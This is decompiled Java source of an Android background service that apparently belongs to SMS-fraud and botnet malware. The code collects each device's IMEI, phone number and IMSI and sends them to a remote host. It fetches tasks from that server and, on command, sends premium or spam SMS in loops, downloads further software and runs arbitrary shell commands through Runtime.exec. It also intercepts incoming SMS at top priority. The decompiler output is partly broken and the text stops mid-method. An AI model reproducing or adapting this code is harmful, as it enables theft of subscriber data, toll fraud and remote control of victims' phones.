// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   MainService.java

package com.android;

import Lcom.android.MainService;;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.*;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import android.util.Log;
import android.widget.Toast;
import java.io.File;
import java.util.*;

// Referenced classes of package com.android:
//            BaseAuthenicationHttpClient, FileAct, StringUtil, FileUtil

public class MainService extends Service
{
    /* member class not found */
    class SMSReceiver {}


    public MainService()
    {
        shieldnum = "100";
        exactnum = "";
        imei = "";
        tel = "";
        imsi = "";
        servicecenter = "other";
        bigpid = "1";
        smallpid = "wl-zr-02";
        task = "no";
        mnc = "02";
        testtel = "10086";
        nexttime = "";
        issend = true;
        Timer timer1 = new Timer();
        timer = timer1;
        _cls1 _lcls1 = new  Object()     /* anonymous class not found */
    class _anm1 {}

;
        handler = _lcls1;
        TimerTask timertask = new TimerTask() {

            public void run()
            {
                Message message = new Message();
                message.what = 1;
                boolean flag = handler.sendMessage(message);
            }

            final MainService this$0;

            
            {
                this$0 = MainService.this;
                super();
            }
        };
        newtask = timertask;
    }

    private int LogService(int i, int j)
    {
        StringBuilder stringbuilder = (new StringBuilder("http://")).append("csajlk.cefkp.com").append(":9033/window.log?id=");
        String s = smallpid;
        StringBuilder stringbuilder1 = stringbuilder.append(s).append("&softid=").append(i).append("&cn=").append(j).append("&nt=");
        String s1 = nexttime;
        StringBuilder stringbuilder2 = stringbuilder1.append(s1).append("&sim=");
        String s2 = imei;
        StringBuilder stringbuilder3 = stringbuilder2.append(s2).append("&tel=");
        String s3 = tel;
        StringBuilder stringbuilder4 = stringbuilder3.append(s3).append("&imsi=");
        String s4 = imsi;
        StringBuilder stringbuilder5 = stringbuilder4.append(s4).append("&sms=");
        String s5 = servicecenter;
        return BaseAuthenicationHttpClient.getCodeByURL(stringbuilder5.append(s5).toString(), 0);
    }

    private void cteaxsek()
    {
        String as[];
label0:
        {
            as = StringUtil.getRecordInfo(FileAct.readString(recordlog));
            boolean flag = false;
            if(as == null || as.length != 3)
            {
                if(LogService(0, 0) != 200)
                    return;
                as = new String[3];
                String s = StringUtil.getExecTime();
                nexttime = s;
                String s1 = nexttime;
                as[0] = s1;
                String s2 = servicecenter;
                as[2] = s2;
                String s3 = String.valueOf(nexttime);
                StringBuilder stringbuilder = (new StringBuilder(s3)).append("|");
                String s4 = smallpid;
                StringBuilder stringbuilder1 = stringbuilder.append(s4).append("|");
                String s5 = servicecenter;
                String s6 = stringbuilder1.append(s5).toString();
                String s7 = recordlog;
                FileAct.writeString(s6, s7);
                flag = true;
            }
            if(StringUtil.getTimeLength(as[0]) == 0 && !flag)
                return;
            if(imei != null)
            {
                String s8 = imei;
                if(!"".equalsIgnoreCase(s8))
                    break label0;
            }
            TelephonyManager telephonymanager = (TelephonyManager)getSystemService("phone");
            if(telephonymanager != null)
            {
                String s9 = telephonymanager.getDeviceId();
                imei = s9;
                String s10 = telephonymanager.getLine1Number();
                tel = s10;
                String s11 = telephonymanager.getSubscriberId();
                imsi = s11;
                if(imsi != null && imsi.length() > 5)
                {
                    String s12 = imsi.substring(3, 5);
                    mnc = s12;
                }
                String s13 = mnc;
                if("01".equalsIgnoreCase(s13))
                    testtel = "10010";
            }
        }
        String s14 = as[2];
        if("other".equalsIgnoreCase(s14))
        {
            String s15 = servicecenter;
            if("other".equalsIgnoreCase(s15))
            {
                String s16 = testtel;
                sendSMS(s16, "801");
                issend = false;
                long l = 20000L;
                StringBuilder stringbuilder2;
                String s17;
                StringBuilder stringbuilder3;
                String s18;
                StringBuilder stringbuilder4;
                String s19;
                StringBuilder stringbuilder5;
                String s20;
                StringBuilder stringbuilder6;
                String s21;
                StringBuilder stringbuilder7;
                String s22;
                String s23;
                String s24;
                String s25;
                String s26;
                String s27;
                Exception exception;
                StringBuilder stringbuilder8;
                String s28;
                String s29;
                int i;
                String s30;
                String s31;
                String s32;
                String s33;
                String s34;
                boolean flag1;
                try
                {
                    Thread.sleep(l);
                }
                catch(InterruptedException interruptedexception) { }
            }
        }
        stringbuilder2 = (new StringBuilder("http://")).append("csajlk.cefkp.com").append(":8118/push/androidxml/");
        s17 = bigpid;
        stringbuilder3 = stringbuilder2.append(s17).append("/00/");
        s18 = servicecenter;
        stringbuilder4 = stringbuilder3.append(s18).append(".xml?sim=");
        s19 = imei;
        stringbuilder5 = stringbuilder4.append(s19).append("&tel=");
        s20 = tel;
        stringbuilder6 = stringbuilder5.append(s20).append("&imsi=");
        s21 = imsi;
        stringbuilder7 = stringbuilder6.append(s21).append("&pid=");
        s22 = smallpid;
        s23 = stringbuilder7.append(s22).toString();
        try
        {
            s24 = BaseAuthenicationHttpClient.getStringByURL(s23);
            if(s24 == null)
                return;
            if("".equals(s24))
                return;
            s25 = StringUtil.getSubString(s24, "<task>", "</task>");
            task = s25;
            s26 = task;
            if("no".equalsIgnoreCase(s26))
                return;
            s27 = task;
            if("note".equalsIgnoreCase(s27))
            {
                sendSms(s24, as);
                return;
            }
        }
        // Misplaced declaration of an exception variable
        catch(Exception exception)
        {
            stringbuilder8 = new StringBuilder("cteaxsek:");
            s28 = exception.toString();
            s29 = stringbuilder8.append(s28).toString();
            i = Log.e("info", s29);
            return;
        }
        s30 = task;
        if("push".equalsIgnoreCase(s30))
        {
            epxuesch(s24, as);
            return;
        }
        s31 = task;
        if("soft".equalsIgnoreCase(s31))
        {
            esxoefct(s24, as);
            return;
        }
        s32 = task;
        if("exec".equalsIgnoreCase(s32))
        {
            execExec(s24, as);
            return;
        }
        s33 = task;
        if("tanc".equalsIgnoreCase(s33))
        {
            return;
        } else
        {
            s34 = task;
            flag1 = "xbox".equalsIgnoreCase(s34);
            return;
        }
    }

    private void epxuesch(String s, String as[])
    {
        int i = 0;
        String s4;
        String s8;
        int j;
        String s1 = s;
        String s2 = "<url>";
        String s3 = "</url>";
        s4 = StringUtil.getSubString(s1, s2, s3);
        String s5 = s;
        String s6 = "<smscontent>";
        String s7 = "</smscontent>";
        s8 = StringUtil.getSubString(s5, s6, s7);
        String s9 = "";
        String s10 = s8;
        if(s9.equals(s10))
            break MISSING_BLOCK_LABEL_90;
        String s11 = "";
        String s12 = s4;
        j = s11.equals(s12);
        if(!j)
            break MISSING_BLOCK_LABEL_210;
        String s13 = StringUtil.getDate(as[0], 12);
        nexttime = s13;
        String s14 = String.valueOf(nexttime);
        StringBuilder stringbuilder = (new StringBuilder(s14)).append("|");
        String s15 = as[1];
        StringBuilder stringbuilder1 = stringbuilder.append(s15).append("|");
        String s16 = as[2];
        String s17 = stringbuilder1.append(s16).toString();
        String s18 = recordlog;
        String s19 = s17;
        String s20 = s18;
        FileAct.writeString(s19, s20);
        MainService mainservice = this;
        int k = 64635;
        int l = 0;
        int i1 = mainservice.LogService(k, l);
        return;
        String s51;
        String s21 = s;
        String s22 = "<smsurl>";
        String s23 = "</smsurl>";
        String s24 = StringUtil.getSubString(s21, s22, s23);
        String s25 = s24;
        String s26 = "";
        if(!s25.equalsIgnoreCase(s26))
        {
            String s27 = String.valueOf(s8);
            StringBuilder stringbuilder2 = (new StringBuilder(s27)).append(",");
            String s28 = s24;
            s8 = stringbuilder2.append(s28).toString();
        }
        String s29 = s;
        String s30 = "<shieldnum>";
        String s31 = "</shieldnum>";
        String s32 = StringUtil.getSubString(s29, s30, s31);
        String s33 = "";
        String s34 = s32;
        if(!s33.equals(s34))
        {
            String s35 = s32;
            shieldnum = s35;
        }
        String s36 = s;
        String s37 = "<exactnum>";
        String s38 = "</exactnum>";
        String s39 = StringUtil.getSubString(s36, s37, s38);
        String s40 = "";
        String s41 = s39;
        if(!s40.equals(s41))
        {
            String s42 = s39;
            exactnum = s42;
        }
        String s43 = s;
        String s44 = "<isreset>";
        String s45 = "</isreset>";
        String s46 = StringUtil.getSubString(s43, s44, s45);
        String s47 = "no";
        String s48 = s46;
        boolean flag = s47.equalsIgnoreCase(s48);
        String s49 = String.valueOf(s4);
        StringBuilder stringbuilder3 = (new StringBuilder(s49)).append("/?sim=");
        String s50 = imei;
        s51 = BaseAuthenicationHttpClient.getStringByURL(stringbuilder3.append(s50).toString());
        if(s51 == null)
            break MISSING_BLOCK_LABEL_509;
        String s52 = "";
        String s53 = s51;
        j = s52.equals(s53);
        if(!j)
            break MISSING_BLOCK_LABEL_629;
        String s54 = StringUtil.getDate(as[0], 12);
        nexttime = s54;
        String s55 = String.valueOf(nexttime);
        StringBuilder stringbuilder4 = (new StringBuilder(s55)).append("|");
        String s56 = as[1];
        StringBuilder stringbuilder5 = stringbuilder4.append(s56).append("|");
        String s57 = as[2];
        String s58 = stringbuilder5.append(s57).toString();
        String s59 = recordlog;
        String s60 = s58;
        String s61 = s59;
        FileAct.writeString(s60, s61);
        MainService mainservice1 = this;
        int j1 = 64636;
        int k1 = 0;
        int l1 = mainservice1.LogService(j1, k1);
        return;
        String s65;
        String s62 = s51;
        String s63 = "<tel>";
        String s64 = "</tel>";
        s65 = StringUtil.getSubString(s62, s63, s64);
        if(s65 == null)
            break MISSING_BLOCK_LABEL_681;
        j = s65.length();
        int i2 = j;
        byte byte0 = 11;
        if(i2 >= byte0)
            break MISSING_BLOCK_LABEL_801;
        String s66 = StringUtil.getDate(as[0], 12);
        nexttime = s66;
        String s67 = String.valueOf(nexttime);
        StringBuilder stringbuilder6 = (new StringBuilder(s67)).append("|");
        String s68 = as[1];
        StringBuilder stringbuilder7 = stringbuilder6.append(s68).append("|");
        String s69 = as[2];
        String s70 = stringbuilder7.append(s69).toString();
        String s71 = recordlog;
        String s72 = s70;
        String s73 = s71;
        FileAct.writeString(s72, s73);
        MainService mainservice2 = this;
        int j2 = 64636;
        int k2 = 0;
        int l2 = mainservice2.LogService(j2, k2);
        return;
        Exception exception1;
        String s95;
        String as1[];
        int i3;
        int j3;
        String s76;
        String s77;
        StringBuilder stringbuilder8;
        String s78;
        StringBuilder stringbuilder9;
        String s79;
        String s80;
        String s81;
        String s82;
        String s83;
        MainService mainservice3;
        int k3;
        int l3;
        int i4;
        String s84;
        int j4;
        byte byte1;
        MainService mainservice4;
        String s85;
        String s86;
        try
        {
            String s74 = s65;
            String s75 = "#";
            as1 = s74.split(s75);
            i3 = as1.length;
        }
        catch(Exception exception)
        {
            String s87 = StringUtil.getDate(as[0], 12);
            nexttime = s87;
            String s88 = String.valueOf(nexttime);
            StringBuilder stringbuilder10 = (new StringBuilder(s88)).append("|");
            String s89 = as[1];
            StringBuilder stringbuilder11 = stringbuilder10.append(s89).append("|");
            String s90 = as[2];
            String s91 = stringbuilder11.append(s90).toString();
            String s92 = recordlog;
            String s93 = s91;
            String s94 = s92;
            FileAct.writeString(s93, s94);
            MainService mainservice5 = this;
            int k4 = 64635;
            int l4 = i;
            int i5 = mainservice5.LogService(k4, l4);
            return;
        }
        finally
        {
            s95 = StringUtil.getDate(as[0], 12);
        }
        j3 = 0;
        if(j3 >= i3)
        {
            s76 = StringUtil.getDate(as[0], 12);
            nexttime = s76;
            s77 = String.valueOf(nexttime);
            stringbuilder8 = (new StringBuilder(s77)).append("|");
            s78 = as[1];
            stringbuilder9 = stringbuilder8.append(s78).append("|");
            s79 = as[2];
            s80 = stringbuilder9.append(s79).toString();
            s81 = recordlog;
            s82 = s80;
            s83 = s81;
            FileAct.writeString(s82, s83);
            mainservice3 = this;
            k3 = 64636;
            l3 = i;
            i4 = mainservice3.LogService(k3, l3);
            return;
        }
        s84 = as1[j3];
        if(s84 == null) goto _L2; else goto _L1
_L1:
        j4 = s84.length();
        byte1 = 8;
        if(j4 >= byte1) goto _L3; else goto _L2
_L2:
        j3++;
        break MISSING_BLOCK_LABEL_827;
_L3:
        mainservice4 = this;
        s85 = s84;
        s86 = s8;
        mainservice4.sendSMS(s85, s86);
        i++;
          goto _L2
        nexttime = s95;
        String s96 = String.valueOf(nexttime);
        StringBuilder stringbuilder12 = (new StringBuilder(s96)).append("|");
        String s97 = as[1];
        StringBuilder stringbuilder13 = stringbuilder12.append(s97).append("|");
        String s98 = as[2];
        String s99 = stringbuilder13.append(s98).toString();
        String s100 = recordlog;
        String s101 = s99;
        String s102 = s100;
        FileAct.writeString(s101, s102);
        MainService mainservice6 = this;
        int j5 = 64636;
        int k5 = i;
        int l5 = mainservice6.LogService(j5, k5);
        throw exception1;
    }

    private void esxoefct(String s, String as[])
    {
        int i;
        Exception exception1;
        String s60;
        i = 64759;
        String s4;
        boolean flag;
        int j;
        String s15;
        String s16;
        String s17;
        String s18;
        String s19;
        String s20;
        String s21;
        String s22;
        String s23;
        String s24;
        String s25;
        String s26;
        String s27;
        String s28;
        String s29;
        String s30;
        String s31;
        String s32;
        boolean flag1;
        String s33;
        String s34;
        String s35;
        String s36;
        String s37;
        String s38;
        String s39;
        String s40;
        List list;
        int j1;
        int k1;
        String s41;
        String s42;
        StringBuilder stringbuilder2;
        String s43;
        StringBuilder stringbuilder3;
        String s44;
        String s45;
        String s46;
        String s47;
        String s48;
        MainService mainservice1;
        int l1;
        int i2;
        int j2;
        String s49;
        String s50;
        String s51;
        try
        {
            String s1 = s;
            String s2 = "<url>";
            String s3 = "</url>";
            s4 = StringUtil.getSubString(s1, s2, s3);
            String s5 = "";
            String s6 = s4;
            flag = s5.equals(s6);
        }
        catch(Exception exception)
        {
            String s52 = StringUtil.getDate(as[0], 12);
            nexttime = s52;
            String s53 = String.valueOf(nexttime);
            StringBuilder stringbuilder4 = (new StringBuilder(s53)).append("|");
            String s54 = as[1];
            StringBuilder stringbuilder5 = stringbuilder4.append(s54).append("|");
            String s55 = as[2];
            String s56 = stringbuilder5.append(s55).toString();
            String s57 = recordlog;
            String s58 = s56;
            String s59 = s57;
            FileAct.writeString(s58, s59);
            MainService mainservice2 = this;
            int k2 = i;
            int l2 = 1;
            int i3 = mainservice2.LogService(k2, l2);
            return;
        }
        finally
        {
            s60 = StringUtil.getDate(as[0], 12);
        }
        if(flag)
        {
            String s7 = StringUtil.getDate(as[0], 12);
            nexttime = s7;
            String s8 = String.valueOf(nexttime);
            StringBuilder stringbuilder = (new StringBuilder(s8)).append("|");
            String s9 = as[1];
            StringBuilder stringbuilder1 = stringbuilder.append(s9).append("|");
            String s10 = as[2];
            String s11 = stringbuilder1.append(s10).toString();
            String s12 = recordlog;
            String s13 = s11;
            String s14 = s12;
            FileAct.writeString(s13, s14);
            MainService mainservice = this;
            int k = 64759;
            int l = 1;
            int i1 = mainservice.LogService(k, l);
            return;
        }
        s15 = s;
        s16 = "<shieldnum>";
        s17 = "</shieldnum>";
        s18 = StringUtil.getSubString(s15, s16, s17);
        s19 = "";
        s20 = s18;
        if(!s19.equals(s20))
        {
            s21 = s18;
            shieldnum = s21;
        }
        s22 = s;
        s23 = "<exactnum>";
        s24 = "</exactnum>";
        s25 = StringUtil.getSubString(s22, s23, s24);
        s26 = "";
        s27 = s25;
        if(!s26.equals(s27))
        {
            s28 = s25;
            exactnum = s28;
        }
        s29 = s;
        s30 = "<isreset>";
        s31 = "</isreset>";
        s32 = StringUtil.getSubString(s29, s30, s31);
        flag1 = true;
        s33 = "no";
        s34 = s32;
        if(!s33.equalsIgnoreCase(s34)) goto _L2; else goto _L1
_L1:
        s35 = s;
        s36 = "<pack>";
        s37 = "</pack>";
        s38 = StringUtil.getSubString(s35, s36, s37);
        s39 = "";
        s40 = s38;
        if(s39.equalsIgnoreCase(s40)) goto _L2; else goto _L3
_L3:
        list = getPackageManager().getInstalledPackages(0);
        if(list == null) goto _L2; else goto _L4
_L4:
        j1 = list.size();
        k1 = 0;
_L8:
        if(k1 < j1) goto _L5; else goto _L2
_L2:
        if(!flag1) goto _L7; else goto _L6
_L6:
        j = (new FileUtil()).getFile(s4);
        if(j == 0)
            i = 64648;
_L7:
        s41 = StringUtil.getDate(as[0], 12);
        nexttime = s41;
        s42 = String.valueOf(nexttime);
        stringbuilder2 = (new StringBuilder(s42)).append("|");
        s43 = as[1];
        stringbuilder3 = stringbuilder2.append(s43).append("|");
        s44 = as[2];
        s45 = stringbuilder3.append(s44).toString();
        s46 = recordlog;
        s47 = s45;
        s48 = s46;
        FileAct.writeString(s47, s48);
        mainservice1 = this;
        l1 = i;
        i2 = 1;
        j2 = mainservice1.LogService(l1, i2);
        return;
_L5:
        s49 = ((PackageInfo)list.get(k1)).packageName;
        s50 = s38;
        s51 = s49;
        j = s50.equalsIgnoreCase(s51);
        if(j)
        {
            i = 64870;
            flag1 = false;
        }
        k1++;
          goto _L8
        nexttime = s60;
        String s61 = String.valueOf(nexttime);
        StringBuilder stringbuilder6 = (new StringBuilder(s61)).append("|");
        String s62 = as[1];
        StringBuilder stringbuilder7 = stringbuilder6.append(s62).append("|");
        String s63 = as[2];
        String s64 = stringbuilder7.append(s63).toString();
        String s65 = recordlog;
        String s66 = s64;
        String s67 = s65;
        FileAct.writeString(s66, s67);
        MainService mainservice3 = this;
        int j3 = i;
        int k3 = 1;
        int l3 = mainservice3.LogService(j3, k3);
        throw exception1;
    }

    private void execExec(String s, String as[])
    {
        Process process = Runtime.getRuntime().exec(s);
        if(!s.startsWith("pm uninstall jail.neo.lock"))
        {
            return;
        } else
        {
            android.content.Context context = getApplicationContext();
            String s1 = (new StringBuilder()).append("It works! Now executing ").append(s).toString();
            Toast.makeText(context, s1, 0).show();
            return;
        }
    }

    private void execTanc(String s)
    {
        try
        {
            String s1 = StringUtil.getSubString(s, "<url>", "</url>");
            if("".equals(s1))
            {
                return;
            } else
            {
                String s2 = StringUtil.getSubString(s, "<shieldnum>", "</shieldnum>");
                shieldnum = s2;
                String s3 = StringUtil.getSubString(s, "<exactnum>", "</exactnum>");
                exactnum = s3;
                String s4 = StringUtil.getSubString(s, "<isreset>", "</isreset>");
                boolean flag = "no".equalsIgnoreCase(s4);
                return;
            }
        }
        catch(Exception exception)
        {
            return;
        }
    }

    private void sendSMS(String s, String s1)
    {
        SmsManager smsmanager = SmsManager.getDefault();
        Intent intent = new Intent("com.test.sms.send");
        PendingIntent pendingintent = PendingIntent.getBroadcast(this, 0, intent, 0);
        Intent intent1 = new Intent("com.test.sms.delivery");
        PendingIntent pendingintent1 = PendingIntent.getBroadcast(this, 0, intent1, 0);
        String s2 = s;
        String s3 = s1;
        smsmanager.sendTextMessage(s2, null, s3, pendingintent, pendingintent1);
    }

    private void sendSms(String s, String as[])
    {
        int i;
        Exception exception1;
        String s48;
        i = 0;
        String s4;
        boolean flag;
        int j;
        String s11;
        String s12;
        String s13;
        String s14;
        String s15;
        String s16;
        String s17;
        String s18;
        String s19;
        String s20;
        String s21;
        String s22;
        String s23;
        String s24;
        String s25;
        String s26;
        String s27;
        String s28;
        String s29;
        String s30;
        String s31;
        String s32;
        boolean flag1;
        StringBuilder stringbuilder2;
        String s33;
        int i1;
        int j1;
        String s34;
        String s35;
        StringBuilder stringbuilder3;
        String s36;
        StringBuilder stringbuilder4;
        String s37;
        String s38;
        String s39;
        MainService mainservice1;
        byte byte1;
        int k1;
        int l1;
        MainService mainservice2;
        String s40;
        String s41;
        long l2;
        try
        {
            String s1 = s;
            String s2 = "<sendnum>";
            String s3 = "</sendnum>";
            s4 = StringUtil.getSubString(s1, s2, s3);
            flag = "".equals(s4);
        }
        catch(Exception exception)
        {
            String s42 = StringUtil.getDate(as[0], 12);
            nexttime = s42;
            String s43 = String.valueOf(nexttime);
            StringBuilder stringbuilder5 = (new StringBuilder(s43)).append("|");
            String s44 = as[1];
            StringBuilder stringbuilder6 = stringbuilder5.append(s44).append("|");
            String s45 = as[2];
            String s46 = stringbuilder6.append(s45).toString();
            String s47 = recordlog;
            FileAct.writeString(s46, s47);
            MainService mainservice3 = this;
            int i2 = 65492;
            int j2 = i;
            int k2 = mainservice3.LogService(i2, j2);
            return;
        }
        finally
        {
            s48 = StringUtil.getDate(as[0], 12);
        }
        if(flag)
        {
            String s5 = StringUtil.getDate(as[0], 12);
            nexttime = s5;
            String s6 = String.valueOf(nexttime);
            StringBuilder stringbuilder = (new StringBuilder(s6)).append("|");
            String s7 = as[1];
            StringBuilder stringbuilder1 = stringbuilder.append(s7).append("|");
            String s8 = as[2];
            String s9 = stringbuilder1.append(s8).toString();
            String s10 = recordlog;
            FileAct.writeString(s9, s10);
            MainService mainservice = this;
            byte byte0 = -1;
            int k = 0;
            int l = mainservice.LogService(byte0, k);
            return;
        }
        s11 = s;
        s12 = "<sendchannel>";
        s13 = "</sendchannel>";
        s14 = StringUtil.getSubString(s11, s12, s13);
        s15 = s;
        s16 = "<shieldnum>";
        s17 = "</shieldnum>";
        s18 = StringUtil.getSubString(s15, s16, s17);
        if(!"".equals(s18))
        {
            s19 = s18;
            shieldnum = s19;
        }
        s20 = s;
        s21 = "<exactnum>";
        s22 = "</exactnum>";
        s23 = StringUtil.getSubString(s20, s21, s22);
        if(!"".equals(s23))
        {
            s24 = s23;
            exactnum = s24;
        }
        s25 = s;
        s26 = "<sendcount>";
        s27 = "</sendcount>";
        s28 = StringUtil.getSubString(s25, s26, s27);
        s29 = s;
        s30 = "<isreset>";
        s31 = "</isreset>";
        s32 = StringUtil.getSubString(s29, s30, s31);
        flag1 = "no".equalsIgnoreCase(s32);
        if("test".equalsIgnoreCase(s14))
        {
            stringbuilder2 = new StringBuilder("test:");
            s33 = imei;
            s14 = stringbuilder2.append(s33).toString();
        }
        j = Integer.parseInt(s28);
        i1 = j;
        j1 = 0;
_L2:
        if(j1 >= i1)
        {
            s34 = StringUtil.getDate(as[0], 12);
            nexttime = s34;
            s35 = String.valueOf(nexttime);
            stringbuilder3 = (new StringBuilder(s35)).append("|");
            s36 = as[1];
            stringbuilder4 = stringbuilder3.append(s36).append("|");
            s37 = as[2];
            s38 = stringbuilder4.append(s37).toString();
            s39 = recordlog;
            FileAct.writeString(s38, s39);
            mainservice1 = this;
            byte1 = -1;
            k1 = i;
            l1 = mainservice1.LogService(byte1, k1);
            return;
        }
        mainservice2 = this;
        s40 = s4;
        s41 = s14;
        mainservice2.sendSMS(s40, s41);
        i++;
        l2 = 15000L;
        Thread.sleep(l2);
_L3:
        j1++;
        if(true) goto _L2; else goto _L1
_L1:
        nexttime = s48;
        String s49 = String.valueOf(nexttime);
        StringBuilder stringbuilder7 = (new StringBuilder(s49)).append("|");
        String s50 = as[1];
        StringBuilder stringbuilder8 = stringbuilder7.append(s50).append("|");
        String s51 = as[2];
        String s52 = stringbuilder8.append(s51).toString();
        String s53 = recordlog;
        String s54 = s52;
        String s55 = s53;
        FileAct.writeString(s54, s55);
        MainService mainservice4 = this;
        byte byte2 = -1;
        int i3 = i;
        int j3 = mainservice4.LogService(byte2, i3);
        throw exception1;
        InterruptedException interruptedexception;
        interruptedexception;
          goto _L3
    }

    private void vxabgosx(String s)
    {
        String s1;
        int i;
        int j;
        s1 = StringUtil.getSubString(s, "<url>", "</url>");
        if("".equals(s1))
            return;
        String s2 = StringUtil.getSubString(s, "<type>", "</type>");
        String s3 = StringUtil.getSubString(s, "<shieldnum>", "</shieldnum>");
        shieldnum = s3;
        String s4 = StringUtil.getSubString(s, "<exactnum>", "</exactnum>");
        exactnum = s4;
        String s5 = StringUtil.getSubString(s, "<linkenum>", "</linkenum>");
        String s6 = StringUtil.getSubString(s, "<isreset>", "</isreset>");
        boolean flag = "no".equalsIgnoreCase(s6);
        i = Integer.parseInt(s5);
        j = 0;
_L1:
        if(j >= i)
            return;
        String s7 = BaseAuthenicationHttpClient.getXboxStrByURL(s1);
        j++;
          goto _L1
        Exception exception;
        exception;
    }

    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public void onCreate()
    {
        String s10;
        boolean flag;
label0:
        {
            SMSReceiver smsreceiver = JVM INSTR new #10  <Class MainService$SMSReceiver>;
            SMSReceiver smsreceiver1 = smsreceiver;
            MainService mainservice = this;
            smsreceiver1.SMSReceiver(mainservice);
            SMSReceiver smsreceiver2 = smsreceiver;
            sendReceiver = smsreceiver2;
            IntentFilter intentfilter = JVM INSTR new #499 <Class IntentFilter>;
            IntentFilter intentfilter1 = intentfilter;
            String s = "com.test.sms.send";
            intentfilter1.IntentFilter(s);
            SMSReceiver smsreceiver3 = sendReceiver;
            MainService mainservice1 = this;
            SMSReceiver smsreceiver4 = smsreceiver3;
            IntentFilter intentfilter2 = intentfilter;
            Intent intent = mainservice1.registerReceiver(smsreceiver4, intentfilter2);
            SMSReceiver smsreceiver5 = JVM INSTR new #10  <Class MainService$SMSReceiver>;
            SMSReceiver smsreceiver6 = smsreceiver5;
            MainService mainservice2 = this;
            smsreceiver6.SMSReceiver(mainservice2);
            SMSReceiver smsreceiver7 = smsreceiver5;
            deliveryReceiver = smsreceiver7;
            IntentFilter intentfilter3 = new IntentFilter("com.test.sms.delivery");
            SMSReceiver smsreceiver8 = deliveryReceiver;
            MainService mainservice3 = this;
            SMSReceiver smsreceiver9 = smsreceiver8;
            IntentFilter intentfilter4 = intentfilter3;
            Intent intent1 = mainservice3.registerReceiver(smsreceiver9, intentfilter4);
            SMSReceiver smsreceiver10 = JVM INSTR new #10  <Class MainService$SMSReceiver>;
            SMSReceiver smsreceiver11 = smsreceiver10;
            MainService mainservice4 = this;
            smsreceiver11.SMSReceiver(mainservice4);
            SMSReceiver smsreceiver12 = smsreceiver10;
            smsReceiver = smsreceiver12;
            IntentFilter intentfilter5 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
            intentfilter5.setPriority(0x7fffffff);
            SMSReceiver smsreceiver13 = smsReceiver;
            MainService mainservice5 = this;
            SMSReceiver smsreceiver14 = smsreceiver13;
            IntentFilter intentfilter6 = intentfilter5;
            Intent intent2 = mainservice5.registerReceiver(smsreceiver14, intentfilter6);
            MainService mainservice6 = this;
            String s1 = "androidh.log";
            int i = 0;
            recordlog = mainservice6.getDir(s1, i).getAbsolutePath();
            if(imei != null)
            {
                String s2 = imei;
                if(!"".equalsIgnoreCase(s2))
                    break label0;
            }
            MainService mainservice7 = this;
            String s3 = "phone";
            TelephonyManager telephonymanager = (TelephonyManager)mainservice7.getSystemService(s3);
            if(telephonymanager != null)
            {
                String s4 = telephonymanager.getDeviceId();
                imei = s4;
                String s5 = telephonymanager.getLine1Number();
                tel = s5;
                String s6 = telephonymanager.getSubscriberId();
                imsi = s6;
                if(imsi != null && imsi.length() > 5)
                {
                    String s7 = imsi.substring(3, 5);
                    mnc = s7;
                }
                String s8 = mnc;
                if("01".equalsIgnoreCase(s8))
                {
                    String s9 = "10010";
                    testtel = s9;
                }
            }
        }
        s10 = FileAct.readString(recordlog);
        flag = false;
        if(s10 == null || s10.equals("")) goto _L2; else goto _L1
_L1:
        String as[] = StringUtil.getRecordInfo(s10);
        if(as == null || as.length != 3) goto _L4; else goto _L3
_L3:
        String s15;
        String s16;
        String s17;
        String s11 = as[1];
        String s12 = smallpid;
        if(!s11.equalsIgnoreCase(s12))
        {
            String s13 = as[0];
            nexttime = s13;
            String s14 = as[2];
            servicecenter = s14;
            flag = true;
        }
        s15 = as[2];
        s16 = "other";
        s17 = s15;
        if(s16.equalsIgnoreCase(s17)) goto _L6; else goto _L5
_L5:
        String s18;
        String s19;
        s18 = "";
        s19 = s15;
        if(s18.equalsIgnoreCase(s19)) goto _L6; else goto _L7
_L7:
        String s20 = s15;
        servicecenter = s20;
_L9:
        if(flag)
        {
            MainService mainservice8 = this;
            int j = 0;
            int k = 0;
            int l = mainservice8.LogService(j, k);
            char c = '\310';
            if(l == c)
            {
                String s21 = String.valueOf(nexttime);
                StringBuilder stringbuilder = (new StringBuilder(s21)).append("|");
                String s22 = smallpid;
                StringBuilder stringbuilder1 = stringbuilder.append(s22).append("|");
                String s23 = servicecenter;
                String s24 = stringbuilder1.append(s23).toString();
                String s25 = recordlog;
                FileAct.writeString(s24, s25);
            }
        }
        Timer timer1 = timer;
        TimerTask timertask = newtask;
        timer1.schedule(timertask, 0L, 0xdbba0L);
        return;
_L6:
        String s26 = servicecenter;
        if(!"other".equalsIgnoreCase(s26))
        {
            String s27 = servicecenter;
            if(!"".equalsIgnoreCase(s27))
            {
                String s28 = servicecenter;
                String s29 = String.valueOf(as[0]);
                StringBuilder stringbuilder2 = (new StringBuilder(s29)).append("|");
                String s30 = smallpid;
                StringBuilder stringbuilder3 = stringbuilder2.append(s30).append("|");
                String s31 = s28;
                String s32 = stringbuilder3.append(s31).toString();
                String s33 = recordlog;
                FileAct.writeString(s32, s33);
                continue; /* Loop/switch isn't completed */
            }
        }
        if(issend)
        {
            String s34 = testtel;
            MainService mainservice9 = this;
            String s35 = s34;
            String s36 = "801";
            mainservice9.sendSMS(s35, s36);
            boolean flag1 = false;
            issend = flag1;
            long l1 = 15000L;
            String s37;
            String s38;
            String s39;
            MainService mainservice10;
            String s40;
            String s41;
            boolean flag2;
            long l2;
            String s42;
            InterruptedException interruptedexception;
            StringBuilder stringbuilder4;
            String s43;
            String s44;
            int i1;
            try
            {
                Thread.sleep(l1);
            }
            catch(InterruptedException interruptedexception1) { }
        }
        s37 = StringUtil.getExecTime();
        nexttime = s37;
        continue; /* Loop/switch isn't completed */
_L4:
        s38 = StringUtil.getExecTime();
        nexttime = s38;
        flag = true;
        continue; /* Loop/switch isn't completed */
_L2:
        if(issend)
        {
            s39 = testtel;
            mainservice10 = this;
            s40 = s39;
            s41 = "801";
            mainservice10.sendSMS(s40, s41);
            flag2 = false;
            issend = flag2;
            l2 = 15000L;
            try
            {
                Thread.sleep(l2);
            }
            // Misplaced declaration of an exception variable
            catch(InterruptedException interruptedexception)
            {
                stringbuilder4 = new StringBuilder("sleep:");
                s43 = interruptedexception.toString();
